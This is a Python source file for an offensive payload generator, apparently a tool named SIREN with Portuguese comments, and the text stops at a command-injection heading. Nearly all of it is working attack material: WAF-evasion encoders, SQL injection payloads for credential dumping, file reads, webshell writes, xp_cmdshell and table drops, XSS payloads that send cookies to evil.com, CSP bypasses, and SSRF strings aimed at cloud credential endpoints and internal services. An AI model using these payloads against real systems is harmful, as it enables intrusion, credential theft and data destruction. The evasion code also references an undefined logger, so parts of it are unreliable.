#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
██████████████████████████████████████████████████████████████████████████
██  SIREN — PAYLOAD ARSENAL ENGINE                                      ██
██  Gerador de payloads ofensivos multi-vetor com evasao integrada      ██
██                                                                      ██
██  Categorias:                                                         ██
██    • SQL Injection (Union, Blind, Error, Time, Stacked)              ██
██    • XSS (Reflected, Stored, DOM, mXSS, Polyglot)                   ██
██    • SSRF (Cloud, Internal, Protocol, DNS Rebinding)                 ██
██    • Command Injection (Linux, Windows, Blind, OOB)                  ██
██    • Path Traversal (Unix, Windows, Null-byte, Double-encode)        ██
██    • Template Injection (Jinja2, Mako, Freemarker, Twig, EL)         ██
██    • NoSQL Injection (MongoDB, CouchDB, Cassandra)                   ██
██    • LDAP Injection                                                   ██
██    • XML/XXE (DTD, Parameter, Blind, OOB)                            ██
██    • Header Injection (CRLF, Host, X-Forwarded)                      ██
██    • Deserialization (Java, Python, PHP, .NET, Ruby)                  ██
██    • Auth Bypass (JWT, OAuth, Session, Cookie)                       ██
██                                                                      ██
██  Cada payload possui:                                                ██
██    - Versao base (raw)                                               ██
██    - Versoes evasivas (WAF bypass, encoding, obfuscation)           ██
██    - Contexto de uso (onde injetar, response esperado)              ██
██    - CVSS estimado e CWE reference                                  ██
██████████████████████████████████████████████████████████████████████████
"""
from __future__ import annotations

import base64
import enum
import hashlib
import html
import itertools
import json
import random
import re
import string
import struct
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, Generator, List, Literal, Optional, Sequence, Tuple

# ═══════════════════════════════════════════════════════════════════════
# ENUMS & TYPES
# ═══════════════════════════════════════════════════════════════════════


class PayloadCategory(enum.Enum):
    SQLI = "sqli"
    XSS = "xss"
    SSRF = "ssrf"
    CMDI = "cmdi"
    PATH_TRAVERSAL = "path_traversal"
    SSTI = "ssti"
    NOSQLI = "nosqli"
    LDAPI = "ldapi"
    XXE = "xxe"
    HEADER_INJECTION = "header_injection"
    DESERIALIZATION = "deserialization"
    AUTH_BYPASS = "auth_bypass"


class EvasionLevel(enum.Enum):
    NONE = 0
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    EXTREME = 4


class InjectionContext(enum.Enum):
    URL_PARAM = "url_param"
    POST_BODY = "post_body"
    HEADER = "header"
    COOKIE = "cookie"
    JSON_BODY = "json_body"
    XML_BODY = "xml_body"
    MULTIPART = "multipart"
    PATH = "path"
    FRAGMENT = "fragment"
    WEBSOCKET = "websocket"


@dataclass
class Payload:
    """Um payload individual com metadata."""

    raw: str
    category: PayloadCategory
    subcategory: str = ""
    description: str = ""
    evasion_level: EvasionLevel = EvasionLevel.NONE
    contexts: List[InjectionContext] = field(
        default_factory=lambda: [InjectionContext.URL_PARAM]
    )
    cwe: str = ""
    cvss_base: float = 0.0
    tags: List[str] = field(default_factory=list)
    expected_response: str = ""
    is_blind: bool = False
    is_time_based: bool = False
    is_oob: bool = False
    platform: str = "generic"

    @property
    def encoded_url(self) -> str:
        return urllib.parse.quote(self.raw, safe="")

    @property
    def encoded_double(self) -> str:
        return urllib.parse.quote(urllib.parse.quote(self.raw, safe=""), safe="")

    @property
    def encoded_html(self) -> str:
        return html.escape(self.raw)

    @property
    def encoded_b64(self) -> str:
        return base64.b64encode(self.raw.encode()).decode()

    @property
    def encoded_unicode(self) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in self.raw)

    @property
    def encoded_hex(self) -> str:
        return "".join(f"%{ord(c):02x}" for c in self.raw)

    def to_dict(self) -> dict:
        return {
            "raw": self.raw,
            "category": self.category.value,
            "subcategory": self.subcategory,
            "description": self.description,
            "evasion_level": self.evasion_level.value,
            "cwe": self.cwe,
            "cvss_base": self.cvss_base,
            "tags": self.tags,
            "is_blind": self.is_blind,
            "platform": self.platform,
        }


# ═══════════════════════════════════════════════════════════════════════
# ENCODING & OBFUSCATION ENGINE
# ═══════════════════════════════════════════════════════════════════════


class PayloadEncoder:
    """Motor de encoding/obfuscation para WAF bypass."""

    @staticmethod
    def url_encode(s: str, full: bool = False) -> str:
        if full:
            return "".join(f"%{ord(c):02x}" for c in s)
        return urllib.parse.quote(s, safe="")

    @staticmethod
    def double_url_encode(s: str) -> str:
        first = urllib.parse.quote(s, safe="")
        return urllib.parse.quote(first, safe="")

    @staticmethod
    def html_encode(s: str, use_numeric: bool = False) -> str:
        if use_numeric:
            return "".join(f"&#{ord(c)};" for c in s)
        return html.escape(s)

    @staticmethod
    def hex_encode(s: str, prefix: str = "0x") -> str:
        return prefix + s.encode().hex()

    @staticmethod
    def unicode_encode(s: str, style: str = "python") -> str:
        if style == "python":
            return "".join(f"\\u{ord(c):04x}" for c in s)
        elif style == "js":
            return "".join(f"\\u{ord(c):04x}" for c in s)
        elif style == "css":
            return "".join(f"\\{ord(c):06x}" for c in s)
        elif style == "html":
            return "".join(f"&#x{ord(c):x};" for c in s)
        return s

    @staticmethod
    def base64_encode(s: str) -> str:
        return base64.b64encode(s.encode()).decode()

    @staticmethod
    def reverse(s: str) -> str:
        return s[::-1]

    @staticmethod
    def case_swap(s: str) -> str:
        return s.swapcase()

    @staticmethod
    def random_case(s: str) -> str:
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    @staticmethod
    def insert_comments_sql(s: str) -> str:
        """Insere comentarios SQL inline para WAF bypass."""
        keywords = [
            "SELECT",
            "UNION",
            "FROM",
            "WHERE",
            "AND",
            "OR",
            "INSERT",
            "UPDATE",
            "DELETE",
            "DROP",
            "TABLE",
            "ORDER",
            "BY",
            "GROUP",
            "HAVING",
            "LIMIT",
            "OFFSET",
            "JOIN",
            "NULL",
            "LIKE",
            "INTO",
        ]
        result = s
        for kw in keywords:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            replacement = "".join(
                (
                    f"/*{''.join(random.choices(string.ascii_lowercase, k=random.randint(1, 3)))}*/"
                    if i == len(kw) // 2
                    else c
                )
                for i, c in enumerate(kw)
            )
            result = pattern.sub(replacement, result, count=1)
        return result

    @staticmethod
    def insert_null_bytes(s: str, positions: str = "random") -> str:
        """Insere null bytes para bypass de filtros."""
        if positions == "prefix":
            return f"%00{s}"
        elif positions == "suffix":
            return f"{s}%00"
        elif positions == "random":
            chars = list(s)
            for _ in range(min(3, len(chars) // 4)):
                pos = random.randint(0, len(chars))
                chars.insert(pos, "%00")
            return "".join(chars)
        return s

    @staticmethod
    def concat_bypass_sql(s: str, dbms: str = "mysql") -> str:
        """Concatenacao de strings para bypass de WAF."""
        if dbms == "mysql":
            parts = [s[i : i + 2] for i in range(0, len(s), 2)]
            return "CONCAT(" + ",".join(f"'{p}'" for p in parts) + ")"
        elif dbms == "mssql":
            parts = [s[i : i + 2] for i in range(0, len(s), 2)]
            return "+".join(f"'{p}'" for p in parts)
        elif dbms == "oracle":
            parts = [s[i : i + 2] for i in range(0, len(s), 2)]
            return "||".join(f"'{p}'" for p in parts)
        elif dbms == "postgres":
            parts = [s[i : i + 2] for i in range(0, len(s), 2)]
            return "||".join(f"'{p}'" for p in parts)
        return s

    @staticmethod
    def char_bypass_sql(s: str, dbms: str = "mysql") -> str:
        """CHAR() bypass para evitar aspas."""
        if dbms == "mysql":
            return "CHAR(" + ",".join(str(ord(c)) for c in s) + ")"
        elif dbms == "mssql":
            return "+".join(f"CHAR({ord(c)})" for c in s)
        elif dbms == "oracle":
            return "||".join(f"CHR({ord(c)})" for c in s)
        elif dbms == "postgres":
            return "||".join(f"CHR({ord(c)})" for c in s)
        return s

    @staticmethod
    def whitespace_bypass(s: str) -> str:
        """Substitui espacos por alternativas para WAF bypass."""
        alternatives = [
            "\t",
            "\n",
            "\r",
            "\x0b",
            "\x0c",
            "/**/",
            "%09",
            "%0a",
            "%0d",
            "%0b",
            "%0c",
            "%a0",
            "/*!",
            "+(",
            ")+",
        ]
        result = s
        for alt in random.sample(alternatives, min(3, len(alternatives))):
            result = result.replace(" ", alt, 1)
        return result

    @staticmethod
    def js_obfuscate(s: str) -> str:
        """Obfusca JavaScript para XSS."""
        techniques = [
            lambda x: f"eval(atob('{base64.b64encode(x.encode()).decode()}'))",
            lambda x: f"eval(String.fromCharCode({','.join(str(ord(c)) for c in x)}))",
            lambda x: f"setTimeout('{x}',0)",
            lambda x: f"[].constructor.constructor('{x}')()",
            lambda x: f"Function('{x}')()",
            lambda x: f"window['eval']('{x}')",
        ]
        return random.choice(techniques)(s)

    @staticmethod
    def apply_evasion(
        payload: str, level: EvasionLevel, category: PayloadCategory
    ) -> List[str]:
        """Aplica camadas de evasao baseado no nivel."""
        e = PayloadEncoder
        variants = [payload]

        if level.value >= EvasionLevel.LOW.value:
            variants.append(e.random_case(payload))
            variants.append(e.url_encode(payload))

        if level.value >= EvasionLevel.MEDIUM.value:
            variants.append(e.double_url_encode(payload))
            variants.append(e.whitespace_bypass(payload))
            if category == PayloadCategory.SQLI:
                variants.append(e.insert_comments_sql(payload))

        if level.value >= EvasionLevel.HIGH.value:
            variants.append(e.unicode_encode(payload, "html"))
            variants.append(e.insert_null_bytes(payload))
            if category == PayloadCategory.XSS:
                for v in list(variants):
                    try:
                        variants.append(e.js_obfuscate(v))
                    except Exception as e:
                        logger.debug("JS obfuscation error: %s", e)

        if level.value >= EvasionLevel.EXTREME.value:
            for v in list(variants[:5]):
                variants.append(e.double_url_encode(e.random_case(v)))
                variants.append(e.unicode_encode(e.whitespace_bypass(v), "html"))

        return list(dict.fromkeys(variants))


# ═══════════════════════════════════════════════════════════════════════
# SQL INJECTION PAYLOADS
# ═══════════════════════════════════════════════════════════════════════


class SQLiPayloads:
    """Gerador de payloads de SQL Injection — completo."""

    CWE = "CWE-89"
    CVSS = 9.8

    # ── Authentication Bypass ────────────────────────────────────────
    AUTH_BYPASS = [
        ("' OR '1'='1", "Classic OR bypass"),
        ("' OR '1'='1'--", "OR bypass with comment"),
        ("' OR '1'='1'#", "OR bypass MySQL comment"),
        ("' OR '1'='1'/*", "OR bypass block comment"),
        ("' OR 1=1--", "Numeric OR bypass"),
        ("' OR 1=1#", "Numeric OR MySQL"),
        ("admin'--", "Admin comment bypass"),
        ("admin'#", "Admin MySQL comment"),
        ("' OR ''='", "Empty string bypass"),
        ("' OR 'x'='x", "Literal match bypass"),
        ("1' OR '1'='1", "Numeric prefix bypass"),
        ("' OR 1=1 LIMIT 1--", "Limited bypass"),
        ("' UNION SELECT 1,1,1--", "Union single row"),
        ("') OR ('1'='1", "Parenthesis bypass"),
        ("')) OR (('1'='1", "Double paren bypass"),
        ("' OR username IS NOT NULL--", "IS NOT NULL bypass"),
        ("' OR username LIKE '%", "LIKE wildcard bypass"),
        ("'; EXEC xp_cmdshell('whoami')--", "MSSQL cmdshell"),
        ("' AND 1=0 UNION SELECT 'admin','password'--", "Union login"),
        ("' OR EXISTS(SELECT 1)--", "EXISTS bypass"),
        ("-1' OR 1=1--", "Negative prefix"),
        ("' OR 1 IN (1)--", "IN clause bypass"),
        ("' OR 1 BETWEEN 0 AND 2--", "BETWEEN bypass"),
        ("' OR ASCII(SUBSTRING('a',1,1))=97--", "ASCII function"),
        ("admin' AND '1'='1", "AND true bypass"),
        ("' HAVING 1=1--", "HAVING bypass"),
        ("' GROUP BY columnnames HAVING 1=1--", "GROUP HAVING"),
        ("' OR 'ab'='a'+'b'--", "String concat MSSQL"),
        ("' OR 'ab'='a'||'b'--", "String concat Oracle"),
        ("1 AND 1=1", "Numeric AND true"),
    ]

    # ── UNION-based ──────────────────────────────────────────────────
    UNION = [
        ("' UNION SELECT NULL--", "1 column detection"),
        ("' UNION SELECT NULL,NULL--", "2 column detection"),
        ("' UNION SELECT NULL,NULL,NULL--", "3 column detection"),
        ("' UNION SELECT NULL,NULL,NULL,NULL--", "4 column detection"),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "5 column detection"),
        ("' UNION SELECT 1,2,3--", "Numeric column test"),
        ("' UNION SELECT 'a','b','c'--", "String column test"),
        (
            "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
            "MySQL table enum",
        ),
        (
            "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
            "MySQL column enum",
        ),
        (
            "' UNION SELECT username,password,NULL FROM users--",
            "Direct credential extraction",
        ),
        ("' UNION SELECT @@version,NULL,NULL--", "MySQL version"),
        ("' UNION SELECT version(),NULL,NULL--", "PostgreSQL version"),
        ("' UNION SELECT @@servername,NULL,NULL--", "MSSQL servername"),
        ("' UNION SELECT user(),database(),NULL--", "MySQL user+db"),
        ("' UNION SELECT current_user,current_database(),NULL--", "PG user+db"),
        ("' UNION ALL SELECT NULL,NULL,NULL--", "UNION ALL variant"),
        (
            "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--",
            "MySQL all tables",
        ),
        (
            "' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--",
            "MySQL all columns",
        ),
        (
            "' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users--",
            "MySQL creds concat",
        ),
        (
            "' UNION SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'--",
            "PG all tables",
        ),
        ("-1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--", "MySQL file read"),
        ("' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/shell.php'--", "MySQL file write"),
    ]

    # ── Error-based ──────────────────────────────────────────────────
    ERROR_BASED = [
        (
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            "MySQL ExtractValue",
        ),
        (
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
            "MySQL UpdateXML",
        ),
        (
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "MySQL double query",
        ),
        ("' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--", "MySQL GTID"),
        (
            "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--",
            "MySQL JSON_KEYS",
        ),
        ("' AND EXP(~(SELECT * FROM (SELECT version())x))--", "MySQL EXP overflow"),
        ("' AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL CONVERT error"),
        ("' AND 1=CAST((SELECT @@version) AS int)--", "MSSQL CAST error"),
        ("' AND 1=db_name()--", "MSSQL db_name error"),
        (
            "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT version FROM v$instance))--",
            "Oracle error based",
        ),
    ]

    # ── Blind Boolean ────────────────────────────────────────────────
    BLIND_BOOLEAN = [
        ("' AND 1=1--", "Boolean true test"),
        ("' AND 1=2--", "Boolean false test"),
        ("' AND (SELECT SUBSTRING(version(),1,1))='5'--", "Version char extract"),
        ("' AND (SELECT LENGTH(database()))>0--", "DB name length"),
        (
            "' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>64--",
            "DB name binary search",
        ),
        ("' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "Table count"),
        (
            "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
            "Username char extract",
        ),
        (
            "' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--",
            "User existence check",
        ),
        (
            "' AND IF(1=1,1,(SELECT table_name FROM information_schema.tables))--",
            "IF conditional",
        ),
        (
            "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)=1--",
            "CASE conditional",
        ),
    ]

    # ── Blind Time-based ─────────────────────────────────────────────
    BLIND_TIME = [
        ("' AND SLEEP(5)--", "MySQL SLEEP"),
        ("' AND (SELECT SLEEP(5))--", "MySQL subquery SLEEP"),
        ("' AND IF(1=1,SLEEP(5),0)--", "MySQL conditional SLEEP"),
        ("'; WAITFOR DELAY '0:0:5'--", "MSSQL WAITFOR"),
        ("' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", "PostgreSQL pg_sleep"),
        ("' OR SLEEP(5)--", "OR SLEEP"),
        ("' AND BENCHMARK(10000000,SHA1('test'))--", "MySQL BENCHMARK"),
        ("' AND (SELECT * FROM (SELECT SLEEP(5))a)--", "Nested SLEEP"),
        ("'; SELECT DBMS_LOCK.SLEEP(5) FROM dual--", "Oracle DBMS_LOCK"),
        (
            "' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--",
            "Conditional time extraction",
        ),
    ]

    # ── Stacked Queries ──────────────────────────────────────────────
    STACKED = [
        ("'; DROP TABLE users--", "Drop table (dangerous)"),
        ("'; INSERT INTO users VALUES('hacked','hacked')--", "Insert user"),
        (
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "Update admin password",
        ),
        ("'; CREATE TABLE pwned(data TEXT)--", "Create table"),
        ("'; EXEC master..xp_cmdshell 'whoami'--", "MSSQL xp_cmdshell"),
        (
            "'; EXEC sp_configure 'show advanced options',1;RECONFIGURE--",
            "MSSQL enable advanced",
        ),
        (
            "'; DECLARE @q NVARCHAR(4000);SET @q='SELECT version()';EXEC(@q)--",
            "MSSQL dynamic exec",
        ),
        ("'; SELECT pg_ls_dir('/')--", "PG directory listing"),
        ("'; COPY users TO '/tmp/dump.csv' CSV HEADER--", "PG data export"),
        ("'; SELECT * FROM pg_shadow--", "PG password hashes"),
    ]

    # ── Second-Order ─────────────────────────────────────────────────
    SECOND_ORDER = [
        ("admin'--", "Username stored for later query"),
        ("test' OR '1'='1", "Registration payload"),
        ("Robert'); DROP TABLE students;--", "Little Bobby Tables"),
        (
            "'+UNION+SELECT+NULL,GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+'1'='1",
            "Stored union",
        ),
    ]

    @classmethod
    def all_payloads(cls) -> List[Payload]:
        """Retorna todos os payloads SQLi."""
        result = []
        for raw, desc in cls.AUTH_BYPASS:
            result.append(
                Payload(
                    raw=raw,
                    category=PayloadCategory.SQLI,
                    subcategory="auth_bypass",
                    description=desc,
                    cwe=cls.CWE,
                    cvss_base=cls.CVSS,
                    tags=["auth"],
                )
            )
        for raw, desc in cls.UNION:
            result.append(
                Payload(
                    raw=raw,
                    category=PayloadCategory.SQLI,
                    subcategory="union",
                    description=desc,
                    cwe=cls.CWE,
                    cvss_base=cls.CVSS,
                    tags=["union", "data_exfil"],
                )
            )
        for raw, desc in cls.ERROR_BASED:
            result.append(
                Payload(
                    raw=raw,
                    category=PayloadCategory.SQLI,
                    subcategory="error_based",
                    description=desc,
                    cwe=cls.CWE,
                    cvss_base=cls.CVSS,
                    tags=["error"],
                )
            )
        for raw, desc in cls.BLIND_BOOLEAN:
            result.append(
                Payload(
                    raw=raw,
                    category=PayloadCategory.SQLI,
                    subcategory="blind_boolean",
                    description=desc,
                    cwe=cls.CWE,
                    cvss_base=cls.CVSS,
                    is_blind=True,
                    tags=["blind", "boolean"],
                )
            )
        for raw, desc in cls.BLIND_TIME:
            result.append(
                Payload(
                    raw=raw,
                    category=PayloadCategory.SQLI,
                    subcategory="blind_time",
                    description=desc,
                    cwe=cls.CWE,
                    cvss_base=cls.CVSS,
                    is_blind=True,
                    is_time_based=True,
                    tags=["blind", "time"],
                )
            )
        for raw, desc in cls.STACKED:
            result.append(
                Payload(
                    raw=raw,
                    category=PayloadCategory.SQLI,
                    subcategory="stacked",
                    description=desc,
                    cwe=cls.CWE,
                    cvss_base=cls.CVSS,
                    tags=["stacked", "dangerous"],
                )
            )
        for raw, desc in cls.SECOND_ORDER:
            result.append(
                Payload(
                    raw=raw,
                    category=PayloadCategory.SQLI,
                    subcategory="second_order",
                    description=desc,
                    cwe=cls.CWE,
                    cvss_base=cls.CVSS,
                    tags=["second_order"],
                )
            )
        return result


# ═══════════════════════════════════════════════════════════════════════
# XSS PAYLOADS
# ═══════════════════════════════════════════════════════════════════════


class XSSPayloads:
    """Gerador de payloads Cross-Site Scripting — completo."""

    CWE = "CWE-79"
    CVSS = 6.1

    REFLECTED = [
        ("<script>alert(1)</script>", "Classic script tag"),
        ("<script>alert(document.domain)</script>", "Domain disclosure"),
        ("<script>alert(document.cookie)</script>", "Cookie theft"),
        ("<img src=x onerror=alert(1)>", "IMG onerror"),
        ('<img src=x onerror="alert(1)">', "IMG onerror quoted"),
        ("<svg onload=alert(1)>", "SVG onload"),
        ("<svg/onload=alert(1)>", "SVG onload no space"),
        ("<body onload=alert(1)>", "Body onload"),
        ("<input onfocus=alert(1) autofocus>", "Input autofocus"),
        ("<select onfocus=alert(1) autofocus>", "Select autofocus"),
        ("<textarea onfocus=alert(1) autofocus>", "Textarea autofocus"),
        ("<details open ontoggle=alert(1)>", "Details ontoggle"),
        ("<marquee onstart=alert(1)>", "Marquee onstart"),
        ("<video><source onerror=alert(1)>", "Video source error"),
        ("<audio src=x onerror=alert(1)>", "Audio onerror"),
        ('<iframe src="javascript:alert(1)">', "Iframe javascript:"),
        ('<a href="javascript:alert(1)">click</a>', "Anchor javascript:"),
        ('<div onmouseover="alert(1)">hover</div>', "Div mouseover"),
        ("<img src=`x`onerror=alert(1)>", "Backtick src"),
        ('"><script>alert(1)</script>', "Break attribute + script"),
        ("'><script>alert(1)</script>", "Single quote break"),
        ('"><img src=x onerror=alert(1)>', "Break + img"),
        (
            '<script>fetch("https://evil.com/?c="+document.cookie)</script>',
            "Cookie exfil",
        ),
        (
            '<script>new Image().src="https://evil.com/?c="+document.cookie</script>',
            "Image cookie exfil",
        ),
    ]

    DOM = [
        ("#<img src=x onerror=alert(1)>", "Hash injection"),
        ("javascript:alert(document.domain)", "URL javascript:"),
        ('<img src=x onerror=eval(atob("YWxlcnQoMSk="))>', "Base64 eval"),
        ("<svg><script>alert&#40;1&#41;</script></svg>", "SVG + HTML entities"),
        ('"><svg/onload=alert(1)//', "Break + SVG onload"),
        (
            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
            "Math mXSS",
        ),
        (
            "<form><math><mtext><form><mglyph><style></math><img src onerror=alert(1)>",
            "Nested form mXSS",
        ),
        ("document.write('<img src=x onerror=alert(1)>')", "document.write injection"),
        ("location.hash.slice(1)", "Hash-based DOM XSS source"),
        ("document.URL", "URL-based DOM XSS source"),
    ]

    POLYGLOT = [
        (
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik!#$@|",
            "Multi-context polyglot",
        ),
        ("<svg/onload=alert(1)//", "SVG polyglot short"),
        ("'-alert(1)-'", "Arithmetic context"),
        ('";alert(1)//', "String break JS"),
        ("</script><script>alert(1)</script>", "Script break"),
        ("<img src=x onerror=alert(1)//", "Comment polyglot"),
        ('"><img src=x onerror="alert(1)', "Attr break polyglot"),
        ("{{constructor.constructor('alert(1)')()}}", "Angular template"),
        ("${alert(1)}", "Template literal"),
        ("#{alert(1)}", "Ruby/CoffeeScript template"),
    ]

    FILTER_BYPASS = [
        ("<scr<script>ipt>alert(1)</scr</script>ipt>", "Recursive tag"),
        ("<SCRIPT>alert(1)</SCRIPT>", "Uppercase tags"),
        ("<ScRiPt>alert(1)</ScRiPt>", "Mixed case"),
        ("<scr\x00ipt>alert(1)</scr\x00ipt>", "Null byte in tag"),
        ('<script\x20type="text/javascript">alert(1)</script>', "Hex space"),
        ("<script\x09>alert(1)</script>", "Tab separator"),
        ("<script\x0d\x0a>alert(1)</script>", "CRLF separator"),
        ('<img """><script>alert(1)</script>">', "Extra quotes"),
        ("<img src=x:alert(alt) onerror=eval(src) alt=1>", "Self-referencing"),
        ("<img/src=x onerror=alert(1)>", "Slash separator"),
        ("<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "SVG animate"),
        ("<svg><set onbegin=alert(1) attributeName=x to=1>", "SVG set"),
        ('<isindex action="javascript:alert(1)" type=image>', "Isindex (legacy)"),
        (
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";"
            'alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//'
            "--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "Multi-context mega",
        ),
    ]

    CSP_BYPASS = [
        (
            '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>'
            '<div ng-app ng-csp>{{constructor.constructor("alert(1)")()}}</div>',
            "Angular CDN CSP bypass",
        ),
        (
            '<script src="data:text/javascript,alert(1)"></script>',
            "Data URI script (if data: allowed)",
        ),
        ('<link rel="prefetch" href="//evil.com">', "Prefetch exfil"),
        (
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            "Meta refresh javascript",
        ),
        ("<script nonce='bypass'>alert(1)</script>", "Nonce guess"),
        ('<base href="https://evil.com/">', "Base tag hijack"),
    ]

    @classmethod
    def all_payloads(cls) -> List[Payload]:
        result = []
        for payloads, subcat in [
            (cls.REFLECTED, "reflected"),
            (cls.DOM, "dom"),
            (cls.POLYGLOT, "polyglot"),
            (cls.FILTER_BYPASS, "filter_bypass"),
            (cls.CSP_BYPASS, "csp_bypass"),
        ]:
            for raw, desc in payloads:
                result.append(
                    Payload(
                        raw=raw,
                        category=PayloadCategory.XSS,
                        subcategory=subcat,
                        description=desc,
                        cwe=cls.CWE,
                        cvss_base=cls.CVSS,
                        tags=[subcat],
                    )
                )
        return result


# ═══════════════════════════════════════════════════════════════════════
# SSRF PAYLOADS
# ═══════════════════════════════════════════════════════════════════════


class SSRFPayloads:
    """Gerador de payloads Server-Side Request Forgery."""

    CWE = "CWE-918"
    CVSS = 7.5

    CLOUD_METADATA = [
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata v1"),
        (
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "AWS IAM creds",
        ),
        ("http://169.254.169.254/latest/user-data", "AWS user-data"),
        ("http://169.254.169.254/latest/api/token", "AWS IMDSv2 token"),
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
        (
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "GCP service token",
        ),
        (
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "Azure metadata",
        ),
        (
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "Azure managed identity token",
        ),
        ("http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"),
        (
            "http://169.254.169.254/openstack/latest/meta_data.json",
            "OpenStack metadata",
        ),
        ("http://169.254.169.254/opc/v1/instance/", "Oracle Cloud metadata"),
        ("http://169.254.170.2/v2/credentials", "ECS container credentials"),
    ]

    INTERNAL_SCAN = [
        ("http://127.0.0.1/", "Localhost direct"),
        ("http://localhost/", "Localhost name"),
        ("http://[::1]/", "IPv6 loopback"),
        ("http://0.0.0.0/", "All interfaces"),
        ("http://0x7f000001/", "Hex IP localhost"),
        ("http://2130706433/", "Decimal IP localhost"),
        ("http://017700000001/", "Octal IP localhost"),
        ("http://127.1/", "Short localhost"),
        ("http://127.0.0.1:22/", "SSH port"),
        ("http://127.0.0.1:3306/", "MySQL port"),
        ("http://127.0.0.1:6379/", "Redis port"),
        ("http://127.0.0.1:9200/", "Elasticsearch port"),
        ("http://127.0.0.1:27017/", "MongoDB port"),
        ("http://127.0.0.1:5432/", "PostgreSQL port"),
        ("http://127.0.0.1:11211/", "Memcached port"),
        ("http://127.0.0.1:8080/", "Alt HTTP port"),
        ("http://127.0.0.1:8443/", "Alt HTTPS port"),
        ("http://10.0.0.1/", "Internal 10.x"),
        ("http://172.16.0.1/", "Internal 172.x"),
        ("http://192.168.0.1/", "Internal 192.168.x"),
    ]

    PROTOCOL_SMUGGLING = [
        ("file:///etc/passwd", "File protocol Linux"),
        ("file:///c:/windows/win.ini", "File protocol Windows"),
        ("dict://127.0.0.1:6379/INFO", "Dict protocol Redis"),
        ("gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a", "Gopher Redis INFO"),
        ("gopher://127.0.0.1:25/_EHLO%20evil.com%0d%0a", "Gopher SMTP"),
        ("ldap://127.0.0.1/", "LDAP protocol"),
        ("tftp://127.0.0.1/test", "TFTP protocol"),
        ("jar:http://evil.com!/test.txt", "JAR protocol"),
        ("netdoc:///etc/passwd", "Netdoc protocol (Java)"),
        ("ftp://127.0.0.1/", "FTP protocol"),
    ]

    BYPASS_TECHNIQUES = [
        ("http://127.0.0.1.nip.io/", "DNS rebinding nip.io"),
        ("http://127.0.0.1.sslip.io/", "DNS rebinding sslip.io"),
        ("http://localtest.me/", "DNS points to 127.0.0.1"),
        ("http://spoofed.burpcollaborator.net/", "Burp collaborator"),
        ("http://127.0.0.1%2523@evil.com/", "URL parser confusion"),
        ("http://evil.com@127.0.0.1/", "Basic auth confusion"),
        ("http://127.0.0.1%00@evil.com/", "Null byte authority"),
        ("http://0177.0.0.1/", "Octal bypass"),
        ("http://0x7f.0x0.0x0.0x1/", "Hex octets"),
        ("http://127.0.0.1:80\\@evil.com/", "Backslash authority"),
        ("http://[0:0:0:0:0:ffff:127.0.0.1]/", "IPv6 mapped IPv4"),
        ("http://①②⑦.⓪.⓪.①/", "Unicode digits"),
    ]

    @classmethod
    def all_payloads(cls) -> List[Payload]:
        result = []
        for payloads, subcat in [
            (cls.CLOUD_METADATA, "cloud_metadata"),
            (cls.INTERNAL_SCAN, "internal"),
            (cls.PROTOCOL_SMUGGLING, "protocol"),
            (cls.BYPASS_TECHNIQUES, "bypass"),
        ]:
            for raw, desc in payloads:
                result.append(
                    Payload(
                        raw=raw,
                        category=PayloadCategory.SSRF,
                        subcategory=subcat,
                        description=desc,
                        cwe=cls.CWE,
                        cvss_base=cls.CVSS,
                        tags=[subcat],
                    )
                )
        return result


# ═══════════════════════════════════════════════════════════════════════
# COMMAND INJECTION PAYLOADS
